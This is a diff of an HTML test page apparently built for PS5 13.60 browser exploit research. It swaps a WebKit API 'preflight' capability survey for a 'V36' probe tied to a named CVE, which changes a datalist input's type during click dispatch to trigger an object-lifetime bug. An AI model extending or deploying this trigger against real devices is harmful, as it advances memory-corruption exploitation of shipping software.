@@ -1,231 +1,108 @@
 <!doctype html>
 <meta charset="utf-8">
-<title>PS5 13.60 WebKit CVE Preflight</title>
+<title>PS5 13.60 - CVE-2026-64783 Probe</title>
 
 <style>
 body {
-    background:#101010;
+    background:#111;
     color:#eee;
-    font:16px monospace;
-    padding:18px;
+    font:18px monospace;
+    padding:20px;
 }
-h2 { margin-bottom:6px; }
-button {
-    font:16px monospace;
-    padding:10px 16px;
-    margin-bottom:15px;
+input, button {
+    font:18px monospace;
+    padding:10px;
+    margin:8px 0;
 }
-.pass { color:#7fff7f; }
-.fail { color:#ff8080; }
-.info { color:#ddd; }
-pre { white-space:pre-wrap; }
+#log {
+    white-space:pre-wrap;
+    margin-top:20px;
+}
 </style>
 
-<h2>PS5 13.60 WebKit CVE Preflight</h2>
-<p>Capability / reachability mapping only</p>
+<h2>PS5 13.60 — V36</h2>
+<p>CVE-2026-64783 / WebKit bug 313521</p>
+<p>Datalist button lifetime probe</p>
 
-<button onclick="run()">RUN TESTS</button>
-<pre id="out">READY</pre>
+<input
+    id="target"
+    type="text"
+    list="values"
+    placeholder="Open datalist">
+
+<datalist id="values">
+    <option value="TEST-A">
+    <option value="TEST-B">
+</datalist>
+
+<br>
+
+<button id="arm">ARM TEST</button>
+
+<pre id="log">READY</pre>
 
 <script>
 "use strict";
 
-const out = document.querySelector("#out");
+const input = document.querySelector("#target");
+const log = document.querySelector("#log");
+const arm = document.querySelector("#arm");
 
-function line(s) {
-    out.textContent += s + "\n";
+let armed = false;
+let changed = false;
+
+function write(s) {
+    log.textContent += "\n" + s;
 }
 
-function exists(name, value) {
-    const ok = typeof value !== "undefined";
-    line((ok ? "[+] " : "[-] ") + name +
-         ": " + (ok ? typeof value : "UNAVAILABLE"));
-    return ok;
-}
+arm.onclick = function () {
 
-function construct(name, fn) {
-    try {
-        const x = fn();
-        line("[+] " + name + ": CONSTRUCTOR OK");
-        return x;
-    } catch(e) {
-        line("[-] " + name + ": " +
-             e.name + ": " + e.message);
-        return null;
-    }
-}
+    if (armed)
+        return;
 
-async function run() {
+    armed = true;
 
-    out.textContent = "";
+    arm.disabled = true;
 
-    line("PS5 13.60 WEBKIT PREFLIGHT");
-    line("==========================");
-    line("");
+    log.textContent =
+        "V36 ARMED\n" +
+        "input.type before = " +
+        input.type + "\n\n" +
+        "Now activate the datalist button/indicator.";
 
-    line("STREAMS");
-    line("-------");
+    /*
+     * Capture click events associated with the input.
+     *
+     * The important lifetime transition is changing
+     * the owning input's type while click dispatch
+     * is still in progress.
+     */
 
-    exists("ReadableStream", window.ReadableStream);
-    exists("WritableStream", window.WritableStream);
-    exists("TransformStream", window.TransformStream);
+    input.addEventListener("click", function () {
 
-    if (typeof TransformStream !== "undefined") {
-        construct("TransformStream", () =>
-            new TransformStream()
-        );
-    }
+        write("CLICK_ENTER");
 
-    line("");
-    line("BUFFER / TYPED ARRAYS");
-    line("---------------------");
+        if (!changed) {
 
-    exists("ArrayBuffer", window.ArrayBuffer);
-    exists("DataView", window.DataView);
-    exists("Uint8Array", window.Uint8Array);
-    exists("BigInt64Array", window.BigInt64Array);
-    exists("SharedArrayBuffer", window.SharedArrayBuffer);
+            changed = true;
 
-    line("");
-    line("CLONING / TRANSFER");
-    line("------------------");
+            write(
+                "BEFORE_TYPE_CHANGE: " +
+                input.type
+            );
 
-    exists("structuredClone", window.structuredClone);
-    exists("MessageChannel", window.MessageChannel);
-    exists("BroadcastChannel", window.BroadcastChannel);
-    exists("Worker", window.Worker);
+            input.type = "button";
 
-    line("");
-    line("DOM LIFETIME");
-    line("------------");
-
-    exists("MutationObserver", window.MutationObserver);
-    exists("ResizeObserver", window.ResizeObserver);
-    exists("IntersectionObserver", window.IntersectionObserver);
-    exists("DOMParser", window.DOMParser);
-    exists("XMLSerializer", window.XMLSerializer);
-    exists("Range", window.Range);
-    exists("NodeIterator", window.NodeIterator);
-
-    line("");
-    line("RANGE");
-
-    try {
-        const d = document.createElement("div");
-        d.innerHTML = "<b>x</b>";
-
-        const r = document.createRange();
-        r.selectNodeContents(d);
-
-        line("[+] Range creation: OK");
-
-        if (typeof r.createContextualFragment === "function")
-            line("[+] createContextualFragment: AVAILABLE");
-        else
-            line("[-] createContextualFragment: UNAVAILABLE");
-
-    } catch(e) {
-        line("[-] Range test: " + e);
-    }
-
-    line("");
-    line("SHADOW DOM");
-    line("----------");
-
-    try {
-        const d = document.createElement("div");
-
-        if (typeof d.attachShadow === "function") {
-            const root = d.attachShadow({mode:"open"});
-            line("[+] ShadowRoot: AVAILABLE");
-            line("[+] slot element: " +
-                 typeof document.createElement("slot"));
-        } else {
-            line("[-] ShadowRoot: UNAVAILABLE");
+            write(
+                "AFTER_TYPE_CHANGE: " +
+                input.type
+            );
         }
-    } catch(e) {
-        line("[-] ShadowRoot: " + e);
-    }
 
-    line("");
-    line("SVG / SMIL");
-    line("----------");
+        write("CLICK_EXIT");
 
-    exists("SVGElement", window.SVGElement);
-    exists("SVGSVGElement", window.SVGSVGElement);
-    exists("SVGPathElement", window.SVGPathElement);
-    exists("SVGAnimationElement", window.SVGAnimationElement);
+    }, true);
 
-    line("");
-    line("MEDIA");
-    line("-----");
-
-    exists("MediaSource", window.MediaSource);
-    exists("MediaRecorder", window.MediaRecorder);
-    exists("AudioContext",
-        window.AudioContext || window.webkitAudioContext);
-
-    line("");
-    line("CANVAS / GRAPHICS");
-    line("-----------------");
-
-    exists("ImageBitmap", window.ImageBitmap);
-    exists("OffscreenCanvas", window.OffscreenCanvas);
-    exists("WebGLRenderingContext",
-        window.WebGLRenderingContext);
-    exists("WebGL2RenderingContext",
-        window.WebGL2RenderingContext);
-
-    line("");
-    line("SECURITY / PARSING");
-    line("------------------");
-
-    exists("trustedTypes", window.trustedTypes);
-    exists("TrustedHTML", window.TrustedHTML);
-
-    line("");
-    line("UI APIs");
-    line("-------");
-
-    const pop = document.createElement("div");
-
-    line(
-        ("popover" in pop ? "[+] " : "[-] ") +
-        "Popover API: " +
-        ("popover" in pop ? "AVAILABLE" : "UNAVAILABLE")
-    );
-
-    const dialog = document.createElement("dialog");
-
-    line(
-        (typeof dialog.showModal === "function"
-            ? "[+] " : "[-] ") +
-        "Dialog API: " +
-        (typeof dialog.showModal === "function"
-            ? "AVAILABLE" : "UNAVAILABLE")
-    );
-
-    line("");
-    line("JAVASCRIPT ENGINE FEATURES");
-    line("--------------------------");
-
-    exists("Proxy", window.Proxy);
-    exists("WeakRef", window.WeakRef);
-    exists("FinalizationRegistry",
-        window.FinalizationRegistry);
-    exists("WebAssembly", window.WebAssembly);
-
-    line("");
-    line("HISTORY");
-    line("-------");
-
-    exists("history.pushState", history.pushState);
-    exists("history.replaceState", history.replaceState);
-
-    line("");
-    line("==========================");
-    line("PREFLIGHT COMPLETE");
-    line("==========================");
-}
-
+    write("TEST ARMED");
+};
 </script>
